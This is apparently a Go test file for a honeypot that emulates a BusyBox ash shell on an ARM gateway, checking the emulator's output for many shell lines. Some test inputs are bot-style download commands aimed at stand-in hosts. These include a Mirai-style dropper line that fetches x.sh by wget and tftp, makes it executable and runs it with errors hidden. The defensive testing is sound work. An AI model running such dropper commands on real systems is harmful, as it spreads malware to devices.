package vfs

import (
	"fmt"
	"io"
	"path"
	"runtime"
	"strings"
	"testing"
	"time"
)

// noColors is the Telnet login shell with ls's colors off (LS_COLORS=none, as a user can set it), so the
// screens in the tests stay readable; the colors themselves are tested in TestLsTerminal.
func noColors() *Shell {
	sh := NewShell()
	sh.vars["LS_COLORS"], sh.exported["LS_COLORS"] = "none", true
	return sh
}

// noTerminal is the login shell with its output going to no terminal, like the oracle's (its output
// goes to a file): what the rows copied from the real ash were measured in.
func noTerminal() *Shell {
	sh := NewShell()
	sh.terminal = false
	return sh
}

// Each row = a line sent by the attacker + what must appear on screen.
func TestRun(t *testing.T) {
	tests := []struct {
		line string
		want string
	}{
		{"whoami", "root\n"},
		{"uname -m", "armv7l\n"},
		{"cd /tmp; pwd", "/tmp\n"},
		{"cd /tmp/../etc && pwd", "/etc\n"},
		{"cd /missing || cd /var/run; pwd", "-sh: cd: can't cd to /missing: No such file or directory\n/var/run\n"},
		{"cd /missing 2>/dev/null || cd /var/run; pwd", "/var/run\n"},
		{"cat /etc/passwd | grep admin", "admin:x:0:0:admin:/root:/bin/sh\n"}, // admin has uid 0 (still root)
		{"cat /proc/cpuinfo | grep 'model name'", "model name\t: ARMv7 Processor rev 5 (v7l)\n"},
		{`echo -e '\x6b\x61\x6d\x69'`, "kami\n"},
		{`echo "a; b" && echo c`, "a; b\nc\n"},
		{"echo -n done", "done"},
		{"/bin/busybox ECCHI", "ECCHI: applet not found\n"},
		{"busybox echo hello", "hello\n"},
		{"wget http://evil.example/bot && echo never-printed", "wget: bad address 'evil.example'\n"}, // no DNS
		{"wget http://203.0.113.7/bot && echo never-printed", "Connecting to 203.0.113.7 (203.0.113.7:80)\n" +
			"wget: can't connect to remote host (203.0.113.7): Connection timed out\n"},
		{"ls /var", "log    run    spool  tmp    www\n"},
		{"cd /tmp; touch a; mkdir b; ls", "a  b\n"},
		{"echo kami > /tmp/.x; cat /tmp/.x; rm /tmp/.x; cat /tmp/.x", "kami\ncat: can't open '/tmp/.x': No such file or directory\n"},
		{"echo one > f; echo two >> f; cat f", "one\ntwo\n"},
		{"echo hi > /missing/file", "-sh: can't create /missing/file: nonexistent directory\n"},
		{"cd /tmp; wget http://x/bot -O - > bot; cat bot; ls", "wget: bad address 'x'\nbot\n"},
		{"cat /missing > f 2>/dev/null; ls", "f\n"},
		{"cat /tmp", "cat: read error: Is a directory\n"},
		{"./bot", "-sh: ./bot: not found\n"},
		{"cd /tmp; cp /bin/busybox x; ./x && echo started", "x: applet not found\n"}, // busybox named "x"
		{"cd /tmp; cp /bin/busybox ls; ./ls /var", "log    run    spool  tmp    www\n"},
		{`cd /tmp; echo -ne '\x7fELF\x01\x01\x01bot' > x; ./x && echo started`, "started\n"}, // malware: runs
		{"ls /etc", "dropbear      hostname      lighttpd      ppp           shadow\n" + // columns as wide as
			"group         hosts         os-release    profile       shells\n" + // the longest name + 2
			"hostapd.conf  issue.net     passwd        resolv.conf   vsftpd.conf\n"},
		{"ps | grep lighttpd", "  349 root      2108 S    /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf\n"}, // port 80 = a running web server
		{"cat /var/run/lighttpd.pid", "349\n"}, // its PID, in the pid-file from its config
		{"ls /var/www", "index.html  login.cgi\n"},
		{"grep document-root /etc/lighttpd/lighttpd.conf", "server.document-root = \"/var/www\"\n"},
		{"cat /var/www/index.html | grep action", "    <form method=\"POST\" action=\"/login.cgi\">\n"},
		{"curl -O http://x/a.sh", "-sh: curl: not found\n"}, // BusyBox has no curl
		{"enable", "-sh: enable: not found\n"},              // Mirai's probe for a vendor CLI
		{"cat /etc/shells", "/bin/ash\n/bin/sh\n"},          // Buildroot: busybox.mk, then skeleton-init-common.mk
		{"grep wheel /etc/group", "wheel:x:10:root\n"},
		{"uname -a", "Linux gateway 4.14.180 #1 SMP Thu Jun  4 12:00:00 UTC 2020 armv7l GNU/Linux\n"},
		{"cat /proc/version", "Linux version 4.14.180 (builder@buildhost) (gcc version 8.3.0 (Buildroot 2019.05.3)) #1 SMP Thu Jun  4 12:00:00 UTC 2020\n"},
		{"cat /etc/os-release | grep PRETTY", "PRETTY_NAME=\"Buildroot 2019.05.3\"\n"}, // a link to /usr/lib/os-release
		{"cat /bin/echo", elfHeader}, // a link to busybox: Mirai reads the ELF header through it
		{"/usr/bin/wget http://x/bot", "wget: bad address 'x'\n"},
		{"cd /bin; ./ls /var", "log    run    spool  tmp    www\n"},
		{"/sbin/init", "init: must be run as PID 1\n"},
		{"cat /var/run/dropbear.pid", "341\n"},
		{"cat /proc/meminfo | grep MemTotal", "MemTotal:         124520 kB\n"},
		{"", ""},
		{";;", "-sh: syntax error: unexpected \";;\"\n"}, // a case's ";;", outside a case
		{"; echo a", "-sh: syntax error: unexpected \";\"\n"},
		{"echo a; | grep a", "-sh: syntax error: unexpected \"|\"\n"},
		{"echo a;", "a\n"},
	}

	for _, tt := range tests {
		got, _, _ := noColors().Run(tt.line)
		if got != tt.want {
			t.Errorf("Run(%q)\n got: %q\nwant: %q", tt.line, got, tt.want)
		}
	}
}

// Redirections like ash (BusyBox 1.30.1, with Buildroot's ASH_BASH_COMPAT): glued to words or not,
// applied in order, errors apart from the output (they skip a | and go where 2 points).
func TestRedirects(t *testing.T) {
	const noFile = "cat: can't open '/nofile': No such file or directory\n"
	tests := []struct {
		line string
		want string
		code int
	}{
		{"cd /tmp; echo hi>x; cat x", "hi\n", 0}, // ">" ends a word
		{"uname -m>/tmp/u; cat /tmp/u", "armv7l\n", 0},
		{"cd /tmp; echo a2>x; cat x", "a2\n", 0},     // "a2" is a word, not a descriptor
		{"cd /tmp; echo 2>x; cat x", "\n", 0},        // "2>": errors to x, echo prints an empty line
		{`cd /tmp; echo "2">x; cat x`, "2\n", 0},     // a quoted 2 is a word
		{`echo ">" '2>x' "a&>b"`, "> 2>x a&>b\n", 0}, // operators in quotes are text
		{"cd /tmp; echo hi>x&&cat x", "hi\n", 0},     // glued to && too
		{"cd /tmp; echo hi 1>x; cat x", "hi\n", 0},
		{"cd /tmp; echo hi >>x; echo ho >>x; cat x", "hi\nho\n", 0},
		{"cd /tmp; echo one >x >y; cat x; cat y", "one\n", 0}, // both created, the last one wins
		{"cd /tmp; >empty; ls", "empty\n", 0},                 // a redirection alone creates the file

		// where the errors go: the order matters, like in any shell
		{"cat /nofile >/dev/null 2>&1", "", 1}, // what bots append to every command
		{"cat /nofile 2>&1 >/dev/null", noFile, 1},
		{"cd /tmp; cat /nofile >f 2>&1; cat f", noFile, 0},
		{"cd /tmp; cat /nofile 2>err; cat err", noFile, 0},
		{"cat /nofile &>/dev/null", "", 1}, // bash's "&>" (ash has it with ASH_BASH_COMPAT)
		{"cat /nofile >&/dev/null", "", 1}, // ">&file" = "&>file"
		{"cat /nofile 2>&/dev/null", "-sh: redir error\n", 1},
		{"nosuchcmd 2>/dev/null", "", 127},
		{"echo hi > /missing/x 2>/dev/null", "-sh: can't create /missing/x: nonexistent directory\n", 1},
		{"echo hi 2>/dev/null > /missing/x", "", 1}, // 2 already pointed to /dev/null
		{"echo hi >&5", "-sh: 5: Bad file descriptor\n", 1},
		{"echo hi >&-", "sh: write error: Bad file descriptor\n", 1},

		// errors skip a pipe, unless 2>&1 sends them into it
		{"cat /nofile | grep x", noFile, 1},
		{"cat /nofile 2>&1 | grep can", noFile, 0},
		{"echo hi >&2 | grep x", "hi\n", 1},

		// input
		{"cat < /etc/hostname", "gateway\n", 0},
		{"grep daemon </etc/passwd", "daemon:*:1:1:daemon:/var:/bin/false\n", 0},
		{"cat < /nofile", "-sh: can't open /nofile: no such file\n", 1},
		{"cat 2>/dev/null </nofile", "", 1}, // ash's own message goes where 2 points by then

		// a redirection without its file: nothing on the line runs
		{"echo hi >", "-sh: syntax error: unexpected newline\n", 2},
		{"echo a; echo b >; echo c", "-sh: syntax error: unexpected \";\"\n", 2},
		{"echo a > > b", "-sh: syntax error: unexpected redirection\n", 2},
		{"echo a > | grep a", "-sh: syntax error: unexpected \"|\"\n", 2},
		{"cd /tmp; echo a >|f; cat f", "a\n", 0}, // ">|" (no space) is ash's "clobber": a plain ">" here

		// a Mirai-style dropper line: every error hidden (nothing was downloaded, so sh can't open x.sh: 2)
		{"cd /tmp || cd /var/run; wget http://203.0.113.5/x.sh -O- >/dev/null 2>&1; " +
			"busybox tftp -g -r x.sh 203.0.113.5 >/dev/null 2>&1; chmod 777 x.sh; sh x.sh >/dev/null 2>&1", "", 2},
	}
	for _, tt := range tests {
		if got, code, _ := noColors().Run(tt.line); got != tt.want || code != tt.code {
			t.Errorf("Run(%q)\n got: %q, exit code %d\nwant: %q, exit code %d", tt.line, got, code, tt.want, tt.code)
		}
	}
}

// Expansions like ash's: every expected output here is what the real BusyBox 1.30.1 ash printed for
// the same line (run as an interactive "-sh" in Docker, image busybox:1.30.1-uclibc), byte for byte.
func TestExpansions(t *testing.T) {
	tests := []struct {
		line string
		want string
		code int
	}{
		// variables and quotes
		{`echo $0 $# $1 $9 $! $* $@ x`, "-sh 0 x\n", 0},
		{`echo $HOME $USER $LOGNAME $SHELL $PATH`, "/root root root /bin/sh /bin:/sbin:/usr/bin:/usr/sbin\n", 0},
		{`echo "$HOME" '$HOME' \$HOME "\$HOME" "\x41" \x41 "a\b" 'a\b' a\ b`, "/root $HOME $HOME $HOME \\x41 x41 a\\b a\\b a b\n", 0},
		{`X="a  b"; echo $X; echo "$X"`, "a b\na  b\n", 0},
		{`X=1 Y=2; echo $X$Y`, "12\n", 0},
		{`X=1 echo $X; echo $X`, "\n\n", 0},
		{`IFS=:; X=a:b:c; echo $X; set -- $X; echo $#`, "a b c\n3\n", 0},
		{`echo "it's" 'say "hi"' "say \"hi\""`, "it's say \"hi\" say \"hi\"\n", 0},
		{`echo $'a\tb' $'\x41'`, "a\tb A\n", 0},
		{`echo a#b # comment`, "a#b\n", 0},
		{`echo $ $. $/ "$" a$`, "$ $. $/ $ a$\n", 0},
		{`X='echo   a   b'; $X`, "a b\n", 0},
		{`$(echo echo) hi`, "hi\n", 0},
		{`e\cho hi`, "hi\n", 0},
		// ${...}
		{`X=; echo [$X] ["$X"] [${X:-d}] [${X-d}] [${Y:-d}] [${Y-d}] [${X:+p}] [${Y+p}]`, "[] [] [d] [] [d] [d] [] []\n", 0},
		{`echo ${Z:=zz} $Z`, "zz zz\n", 0},
		{`echo ${#HOME} ${#Q}`, "5 0\n", 0},
		{`X=/tmp/a.tar.gz; echo ${X#*/} ${X##*/} ${X%.*} ${X%%.*}`, "tmp/a.tar.gz a.tar.gz /tmp/a.tar /tmp/a\n", 0},
		{`X=abcabc; echo ${X/b/Z} ${X//b/Z} ${X/#a/Z} ${X/%c/Z} ${X/b} ${X:1:2} ${X:2} ${X: -2}`, "aZcabc aZcaZc abcabc abcabc acabc bc cabc bc\n", 0},
		{`echo ${HOME:-"a  b"} ${UNSET:-"a  b"} ${UNSET:-a  b}`, "/root a  b a b\n", 0},
		{`echo ${PATH//:/ }`, "/bin /sbin /usr/bin /usr/sbin\n", 0},
		{`echo ${x?}; echo after`, "-sh: x: parameter not set\n", 2},
		{`echo ${x:?}; echo after`, "-sh: x: parameter not set or null\n", 2},
		{`echo ${x?oops}; echo after`, "-sh: x: oops\n", 2},
		{`echo ${1x}; echo after`, "-sh: syntax error: bad substitution\n", 2},
		// $(...) and `...`
		{"echo $(echo a  b) \"$(echo a  b)\" `echo c` \"`echo d`\"", "a b a b c d\n", 0},
		{`echo $(echo "a  b") "$(echo "a  b")"`, "a b a  b\n", 0},
		{`echo "$(echo "nested "quotes"")"`, "nested quotes\n", 0},
		{"echo `echo \\`echo nested\\``", "nested\n", 0},
		{`X=$(false); echo $?`, "1\n", 0},
		{`echo $(exit 4); echo $?`, "\n0\n", 0},
		{`echo $(nosuch) after; echo $?`, "-sh: nosuch: not found\nafter\n0\n", 0},
		{`X=1; echo $(X=2; echo $X) $X`, "2 1\n", 0},
		{`cd /tmp; echo $(pwd; cd /; pwd); pwd`, "/tmp /\n/tmp\n", 0},
		{`X=$(echo a; echo b); echo "$X"; echo $X`, "a\nb\na b\n", 0},
		{"echo \"$(echo 'a\nb')\"; echo after", "a\nb\nafter\n", 0}, // a newline in quotes doesn't end the line
		{"X='1\n2'; echo \"$X\" $X", "1\n2 1 2\n", 0},
		// $((...))
		{`echo $((1+2*3)) $((7/2)) $((7%3)) $((2**10)) $((-2**2)) $((1<<4)) $((5>3)) $((!0)) $((~0)) $((0x10)) $((010))`, "7 3 1 1024 4 16 1 1 -1 16 8\n", 0},
		{`X=5+1; echo $((X*2)) $((X)) $((Y+1))`, "12 6 1\n", 0},
		{`X=abc; echo $((X+1)); echo after`, "1\nafter\n", 0},
		{`echo $(( 1 ? 2 : 3 )) $(( 0 ? 2 : 3 ))`, "2 3\n", 0},
		{`echo $((x=5)); echo $x`, "5\n5\n", 0},
		{`echo $(( x++ )) $x; echo after`, "0 1\nafter\n", 0},
		{`echo $(( 1 == 1 , 2 ))`, "2\n", 0},
		{`echo $((9223372036854775807+1))`, "-9223372036854775808\n", 0},
		{`echo $(( 1 << 64 )) $(( 1 << -1 ))`, "1 -9223372036854775808\n", 0},
		{`echo $(( 2 ** 62 ** 2 ))`, "0\n", 0},
		{`echo $((1/0)); echo after`, "-sh: divide by zero\n", 2},
		{`echo $((08)) ; echo after`, "-sh: arithmetic syntax error\n", 2},
		{`echo $(( 2 ** -1 )); echo after`, "-sh: exponent less than 0\n", 2},
		{`echo $((1 ? 2)); echo after`, "-sh: malformed ?: operator\n", 2},
		{`echo $((1+$(echo 2)))`, "3\n", 0},
		// ~ and * ? [
		{`echo ~ ~/x a~ "~" ~root ~zz`, "/root /root/x a~ ~ /root ~zz\n", 0},
		{`unset HOME; echo ~ ~/x`, "~ ~/x\n", 0},
		{`echo /etc/pas* /etc/nomatch* "/etc/pas*" /etc/pass?d /etc/[p]asswd`, "/etc/passwd /etc/nomatch* /etc/pas* /etc/passwd /etc/passwd\n", 0},
		{`cd /etc; echo [p]asswd [!a]asswd ?asswd p*d`, "passwd passwd passwd passwd\n", 0},
		{`cd /root; echo *; echo .*`, "*\n. ..\n", 0},
		{`X='*'; echo $X; echo "$X"`, "*\n*\n", 0},
		{`cd /tmp; touch .h v; echo *; echo .*`, "v\n. .. .h\n", 0}, // (ash's /tmp also had the test's own file)
		{`set -- "a b" c; set -- "$@" d; echo $#; set -- "$*"; echo $#`, "3\n1\n", 0},
		{`set -- a b; set -- "x$@y"; echo $# "$1" "$2"`, "2 xa by\n", 0},
		{`set -- a "b c"; echo "[$*]" "[$@]"; IFS=-; echo "[$*]"`, "[a b c] [a b c]\n[a-b c]\n", 0},
		// unfinished: nothing runs
		{`echo $(id; echo x`, "-sh: syntax error: unexpected end of file (expecting \")\")\n", 2},
		{"echo `id", "-sh: syntax error: EOF in backquote substitution\n", 2},
		{`echo ${X`, "-sh: syntax error: missing '}'\n", 2},
		{`echo $((1+2`, "-sh: syntax error: missing '))'\n", 2},
		{`echo "abc`, "-sh: syntax error: unterminated quoted string\n", 2},
		{`echo a &&`, "-sh: syntax error: unexpected end of file\n", 2},
		{`echo a;;echo b`, "-sh: syntax error: unexpected \";;\"\n", 2},
		{`"" ; echo $?`, "-sh: : Permission denied\n127\n", 0},
	}
	for _, tt := range tests {
		if got, code := runTyped(tt.line); got != tt.want || code != tt.code {
			t.Errorf("Run(%q)\n got: %q, exit code %d\nwant: %q, exit code %d", tt.line, got, code, tt.want, tt.code)
		}
	}
}

// The shell's own commands, child shells and scripts: also measured on the real ash, byte for byte.
func TestShellBuiltins(t *testing.T) {
	tests := []struct {
		line string
		want string
		code int
	}{
		// sh -c, sh FILE, echo ... | sh: a child shell, named "sh" (or as told) in its errors
		{`sh -c 'echo $0; nosuch; exit 5'; echo $?`, "sh\nsh: nosuch: not found\n5\n", 0},
		{`sh -c 'cd /nope'; echo $?`, "sh: cd: line 1: can't cd to /nope: No such file or directory\n2\n", 0},
		{`sh -c 'exit abc'; echo $?`, "sh: exit: line 1: Illegal number: abc\n2\n", 0},
		{`sh -c 'echo ${x?}'; echo $?`, "sh: x: parameter not set\n2\n", 0},
		{`sh -c; echo $?`, "sh: -c requires an argument\n2\n", 0},
		{`sh -c 'echo $0 $1' name arg; echo $?`, "name arg\n0\n", 0},
		{`sh -c 'nosuch' name; echo $?`, "name: line 1: nosuch: not found\n127\n", 0},
		{`sh -c 'echo $0 $# $@' n a b`, "n 2 a b\n", 0},
		{`sh nofile.sh; echo $?`, "sh: can't open 'nofile.sh': No such file or directory\n2\n", 0},
		{`echo a | sh -c 'cat'`, "a\n", 0},
		{`echo 'echo from stdin' | sh`, "from stdin\n", 0},
		{`echo 'echo in; nosuch; cd /nope' > /tmp/s.sh; sh /tmp/s.sh; echo $?`, "in\n/tmp/s.sh: line 1: nosuch: not found\n/tmp/s.sh: cd: line 1: can't cd to /nope: No such file or directory\n2\n", 0},
		{`echo 'echo $0 $1 $#' > /tmp/z.sh; sh /tmp/z.sh a b`, "/tmp/z.sh a 2\n", 0},
		{`echo "a" > /tmp/x.sh; chmod +x /tmp/x.sh; /tmp/x.sh; echo $?`, "/tmp/x.sh: line 1: a: not found\n127\n", 0},
		// eval and . run in this shell
		{`eval 'echo a; nosuch; echo b'; echo $?`, "a\n-sh: eval: nosuch: not found\nb\n0\n", 0},
		{`eval 'X=7'; echo $X`, "7\n", 0},
		{`eval "echo \$HOME"`, "/root\n", 0},
		{`eval; echo $?`, "0\n", 0},
		{`echo 'echo in; nosuch' > /tmp/s.sh; . /tmp/s.sh; echo $?`, "in\n-sh: /tmp/s.sh: line 1: nosuch: not found\n127\n", 0},
		{`. nofile; echo $?`, "-sh: .: nofile: not found\n", 2},
		{`. ./nofile; echo $?`, "-sh: .: can't open './nofile': No such file or directory\n", 2},
		{`source ./nofile; echo $?`, "-sh: source: can't open './nofile': No such file or directory\n", 2},
		{`. ; echo $?`, "2\n", 0},
		// ( ) is a subshell
		{`(cd /tmp; X=1); pwd; echo [$X]`, "/root\n[]\n", 0},
		{`(exit 3); echo $?`, "3\n", 0},
		{`(echo a; exit 2; echo b); echo $?`, "a\n2\n", 0},
		{`X=1; (X=2; echo $X); echo $X`, "2\n1\n", 0},
		// cd, exit, exec
		{`cd /nope; echo $?`, "-sh: cd: can't cd to /nope: No such file or directory\n2\n", 0},
		{`cd /nope || echo fail; pwd`, "-sh: cd: can't cd to /nope: No such file or directory\nfail\n/root\n", 0},
		{`cd /etc/passwd; echo $?`, "-sh: cd: can't cd to /etc/passwd: Not a directory\n2\n", 0},
		{`cd /etc/passwd/x; echo $?`, "-sh: cd: can't cd to /etc/passwd/x: Not a directory\n2\n", 0},
		{`cd /tmp; cd /etc; echo $PWD $OLDPWD; cd -; echo $PWD`, "/etc /tmp\n/tmp\n/tmp\n", 0},
		{`cd -; echo $?`, "/root\n0\n", 0},
		{`exit abc; echo after`, "-sh: exit: Illegal number: abc\n", 2},
		{`exit 1x`, "-sh: exit: Illegal number: 1x\n", 2},
		{`sh -c 'exit 7'; echo $?; (exit 300); echo $?`, "7\n44\n", 0},
		{`echo a; exec echo b; echo c`, "a\nb\n", 0},
		{`exec nosuch; echo after`, "-sh: exec: line 1: nosuch: not found\n", 127},
		{`logout`, "-sh: logout: not found\n", 127},
		{`quit`, "-sh: quit: not found\n", 127},
		// variables: export, readonly, unset, set, shift; $PATH
		{`export A=1 B; echo $A`, "1\n", 0},
		{`export Q=$(echo a b); echo "$Q"`, "a b\n", 0},
		{`export 1a=2; echo after`, "-sh: export: 1a: bad variable name\n", 2},
		{`export A-B; echo after`, "-sh: export: A-B: bad variable name\n", 2},
		{`X="it's"; readonly X; readonly`, "readonly X='it'\"'\"'s'\n", 0},
		{`readonly R=1; R=2; echo $R`, "-sh: R: is read only\n", 2},
		{`readonly R=1; unset R; echo $R`, "-sh: unset: R: is read only\n", 2},
		{`X=1; unset X; echo [$X]`, "[]\n", 0},
		{`set -- a b c; shift; echo $1 $# "$@"`, "b 2 b c\n", 0},
		{`set -- "a b" c; echo "$*"`, "a b c\n", 0},
		{`X='a b'; set -- $X; echo $#; set -- "$X"; echo $#`, "2\n1\n", 0},
		{`set x; echo $#`, "1\n", 0},
		{`shift 5; echo after`, "after\n", 0},
		{`shift x; echo after`, "-sh: shift: Illegal number: x\n", 2},
		{`set +o history; echo $?`, "-sh: set: illegal option +o history\n1\n", 0},
		{`set -e; echo $?`, "0\n", 0},
		{`unset PATH; ls`, "-sh: ls: not found\n", 127},
		{`X+=b`, "-sh: X+=b: not found\n", 127},
		{`: ; echo $?`, "0\n", 0},
		{`: > /tmp/f; ls /tmp/f`, "/tmp/f\n", 0},
	}
	for _, tt := range tests {
		if got, code, _ := noTerminal().Run(tt.line); got != tt.want || code != tt.code {
			t.Errorf("Run(%q)\n got: %q, exit code %d\nwant: %q, exit code %d", tt.line, got, code, tt.want, tt.code)
		}
	}
	// exec replaces the shell: the session ends with the command
	if _, code, exit := NewShell().Run("exec false"); code != 1 || !exit {
		t.Errorf("exec false: exit code %d, session ended %v (want 1, true)", code, exit)
	}
	if _, code, exit := NewShell().Run("exit 300"); code != 44 || !exit {
		t.Errorf("exit 300: exit code %d, session ended %v (want 44, true)", code, exit)
	}
}

// The applets bots use (6b), measured on the real BusyBox 1.30.1 the same way as TestExpansions. As in
// the oracle's container, the files stay from one line to the next (each line in a new shell).
func TestApplets(t *testing.T) {
	tests := []struct {
		line string
		want string
		code int
	}{
		{"printf 'a b\nc d e\n\nf\n' > /tmp/t; wc /tmp/t; wc -l /tmp/t; wc -c < /tmp/t; wc -w /tmp/t /tmp/t; cat /tmp/t | wc -l; wc -L /tmp/t", "        4         6        13 /tmp/t\n4 /tmp/t\n13\n        6 /tmp/t\n        6 /tmp/t\n       12 total\n4\n5 /tmp/t\n", 0},
		{`wc /nofile; echo $?`, "wc: /nofile: No such file or directory\n1\n", 0},
		{`printf 'x' | wc`, "        0         1         1\n", 0},
		{"tail /tmp/n | tr '\n' ' '; echo; tail -n 2 /tmp/n; tail -2 /tmp/n; tail -n +11 /tmp/n; tail -c 4 /tmp/n", "3 4 5 6 7 8 9 10 11 12 \n11\n12\n11\n12\n11\n12\n\n12\n", 0},
		{`head /tmp/n /tmp/t`, "==> /tmp/n <==\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n==> /tmp/t <==\na b\nc d e\n\nf\n", 0},
		{`head /nofile; echo $?`, "head: /nofile: No such file or directory\n1\n", 0},
		{`echo 'root:x:0:0:root:/root:/bin/sh' | cut -d: -f1,6; echo abcdef | cut -c 2-4; echo 'a b c' | cut -d ' ' -f 2-; echo abc | cut -f1; cut; echo $?`, "root:/root\nbcd\nb c\nabc\ncut: expected a list of bytes, characters, or fields\n1\n", 0},
		{"echo 'a b c' | awk '{print $2}'; echo 'a:b:c' | awk -F: '{print $1,$3}'; printf 'x 1\ny 2\n' | awk 'NR==2 {print $2;}'; printf 'x 1\ny 2\n' | awk 'FNR == 2 {print $1}'", "b\na c\n2\ny\n", 0},
		{"printf 'model name : ARMv7 rev 5\n' | awk '{print $4,$5,$6,$7,$8,$9;}'", "ARMv7 rev 5   \n", 0},
		{"printf 'Mem: 121 57 37 0 26 59\n' | awk '{print $2 ,$3, $4, $5, $6, $7}'", "121 57 37 0 26 59\n", 0},
		{"printf 'a\nb\n' | awk 'END{print NR}'; printf 'a b\n' | awk '{print NF, $NF, $0}'; echo x | awk '{print \"v=\" $1}'; printf 'ab\ncd\n' | awk '/c/'", "2\n2 b a b\nv=x\ncd\n", 0},
		{"echo hello | sed 's/l/L/'; echo hello | sed 's/l/L/g'; echo hello | sed -e 's/h/H/' -e 's/o/0/'; printf 'a\nb\nc\n' | sed -n '2p'; printf 'a\nb\nc\n' | sed '2d'; echo 'a.b' | sed 's/\\./-/'", "heLlo\nheLLo\nHell0\nb\na\nc\na-b\n", 0},
		{`echo abc > /tmp/s; sed -i 's/b/X/' /tmp/s; cat /tmp/s; sed; echo $?`, "aXc\nBusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n\nUsage: sed [-i[SFX]] [-nrE] [-f FILE]... [-e CMD]... [FILE]...\nor: sed [-i[SFX]] [-nrE] CMD [FILE]...\n\n\t-e CMD\tAdd CMD to sed commands to be executed\n\t-f FILE\tAdd FILE contents to sed commands to be executed\n\t-i[SFX]\tEdit files in-place (otherwise sends to stdout)\n\t\tOptionally back files up, appending SFX\n\t-n\tSuppress automatic printing of pattern space\n\t-r,-E\tUse extended regex syntax\n\nIf no -e or -f, the first non-option argument is the sed command string.\nRemaining arguments are input files (stdin if none).\n1\n", 0},
		{`echo hello | tr a-z A-Z; echo hello | tr -d l; echo 'a  b' | tr -s ' '; echo abc | tr '[:lower:]' '[:upper:]'`, "HELLO\nheo\na b\nABC\n", 0},
		{`which ls sh cat nosuch; echo $?; which; echo $?`, "/bin/ls\n/bin/sh\n/bin/cat\n1\nBusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n\nUsage: which [COMMAND]...\n\nLocate a COMMAND\n1\n", 0},
		{`type ls cd echo nosuch; echo $?`, "ls is /bin/ls\ncd is a shell builtin\necho is a shell builtin\nnosuch: not found\n127\n", 0},
		{`command -v ls cd nosuch; echo $?`, "/bin/ls\n0\n", 0},
		{`command ls /nonexist; echo $?`, "ls: /nonexist: No such file or directory\n1\n", 0},
		{`date -u -d @0; date -u -d @86400 '+%Y-%m-%d %H:%M:%S'; date -u +%s -d @5; date -u -d @0 +%a%b%e%j%y%T%Z%z%D%R%u%w%p%I%M%n%t%%`, "Thu Jan  1 00:00:00 UTC 1970\n1970-01-02 00:00:00\n5\nThuJan 10017000:00:00UTC+000001/01/7000:0044AM1200\n\t%\n", 0},
		{`date -R -u -d @0; date -I -u -d @0; date -Iseconds -u -d @0; date -d @x; date --help 2>&1 | head -2`, "Thu, 01 Jan 1970 00:00:00 UTC\n1970-01-01\n1970-01-01T00:00:00UTC\ndate: invalid date '@x'\nBusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n\n", 0},
		{"printf '%s-%d-%x-%o-%c-%5s|%-5s|%05d %%\n' a 42 255 8 zz ab cd 7; printf 'a\\tb\n'; printf '%s\n' x y z; printf; echo $?; printf '%d\n' abc; echo $?", "a-42-ff-10-z-   ab|cd   |00007 %\na\tb\nx\ny\nz\nsh: usage: printf FORMAT [ARGUMENT...]\n2\nsh: invalid number 'abc'\n0\n1\n", 0},
		{"printf '\\x41\\101\n'; printf '%b\n' 'a\\tb'; printf hi; echo", "AA\na\tb\nhi\n", 0},
		{`test -f /etc/passwd && echo f; [ -d /etc ] && echo d; [ -e /nope ] || echo noe; [ 1 -eq 1 ] && echo eq; [ a = b ] || echo ne; [ -z "" ] && echo z; [ -n x ] && echo n; [ ! -f /etc ] && echo notf`, "f\nd\nnoe\neq\nne\nz\nn\nnotf\n", 0},
		{`[ 1 -lt 2 -a 3 -gt 2 ] && echo and; [ a != a -o 1 -le 1 ] && echo or; [[ x == x ]] && echo dbl; [ 1 -eq x ]; echo $?; [ 1 ; echo $?; test; echo $?; [ abc ]; echo $?`, "and\nor\ndbl\nsh: x: bad number\n2\nsh: missing ]\n2\n1\n0\n", 0},
		{`help | head -4`, "Built-in commands:\n------------------\n\t. : [ [[ alias bg break cd chdir command continue echo eval exec\n\texit export false fg getopts hash help history jobs kill let\n", 0},
		{`echo 'a b' | (read x y; echo "$y-$x"); read v < /tmp/n; echo $v; echo a | read q; echo [$q]`, "b-a\n1\n[]\n", 0},
		{`echo 'a b c' | (read x y; echo "[$y]")`, "[b c]\n", 0},
		// what the first mutation run found untested (also measured on the real BusyBox)
		{`echo 'a+b' | grep 'a+b'; echo aab | grep 'a+b'; echo $?`, "a+b\n1\n", 0},            // in a basic regex + is a +
		{`echo abcd | grep -oE 'ab|abcd'; echo abcd | sed -E 's/ab|abcd/X/'`, "abcd\nX\n", 0}, // the longest match
		{"printf '1\\n2\\n3\\n4\\n5\\n' | head -n -2", "1\n2\n3\n", 0},
		{`echo xyz | tr a-z A-Z`, "XYZ\n", 0},
		{"printf '10\\n9\\n' | awk '$1 > 9'", "10\n", 0},                                           // numbers, not text ("10" < "9")
		{"echo | awk '{print 7%2.5, 5%.1, -7%3, 7.9%2, 5%0.3, 5.5%2}'", "2 0 -1 1.9 0.2 1.5\n", 0}, // % of fractions (FuzzRun: 0%.1 divided by 0)
		{`touch /tmp/x; export PATH=/tmp:$PATH; which x; echo $?`, "1\n", 0},                       // not executable
		{`echo abc | grep -w c; echo $?; echo "a c" | grep -w c`, "1\na c\n", 0},
		{"printf 'a\\nb\\nc\\n' | sed '/b/d'; printf 'a\\nb\\nc\\n' | sed -n '/a/,/b/p'", "a\nc\na\nb\n", 0},
		{"printf 'x\\ny\\n' > /tmp/h; wc -l /nofile /tmp/h 2>/dev/null; echo $?", "        2 /tmp/h\n        2 total\n1\n", 0},
		{`which ls nosuch 2>/dev/null | cat; type nosuch ls 2>/dev/null`, "/bin/ls\nnosuch: not found\nls is /bin/ls\n", 127},
		{"printf 'b\na\nc\nb\n' | sort; printf 'b\na\nc\nb\n' | sort -u; printf '10\n9\n100\n' | sort -n; printf 'b\na\n' | sort -r", "a\nb\nb\nc\na\nb\nc\n9\n10\n100\nb\na\n", 0},
		{"printf 'a\na\nb\na\n' | uniq; printf 'a\na\nb\n' | uniq -c", "a\nb\na\n      2 a\n      1 b\n", 0},
		{`seq 3; seq 2 4; seq 1 2 7; seq 3 1; seq -s, 3; echo $?`, "1\n2\n3\n2\n3\n4\n1\n3\n5\n7\n1,2,3\n0\n", 0},
